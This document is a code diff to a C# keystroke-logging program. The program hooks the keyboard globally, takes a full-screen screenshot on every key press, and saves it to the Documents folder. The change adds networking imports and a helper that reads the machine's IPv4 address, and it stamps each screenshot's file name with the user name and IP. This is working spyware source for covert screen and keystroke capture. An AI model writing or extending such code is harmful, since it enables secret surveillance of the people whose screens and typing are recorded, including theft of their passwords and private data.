@@ -8,6 +8,8 @@ using System.Runtime.InteropServices;
 
 using System.Drawing;
 using System.Drawing.Imaging;
+using System.Net;
+using System.Net.Sockets;
 
 namespace keystroke
 {
@@ -45,6 +47,20 @@ namespace keystroke
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+        private static string GetLocalIPAddress()
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    return ip.ToString();
+                }
+            }
+            throw new Exception("No network adapters with an IPv4 address in the system!");
+        }
+
+
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -64,9 +80,11 @@ namespace keystroke
 
                 memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
 
+                string urName = System.Environment.UserName;
+                string ipAddr = GetLocalIPAddress();
                 //That's it! Save the image in the directory and this will work like charm.  
                 string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
-                          @"\Screenshot" + "_" +
+                          @"\Screenshot" + "_" + urName + "_" + ipAddr + "_" +
                           DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");
 
                 // save it  
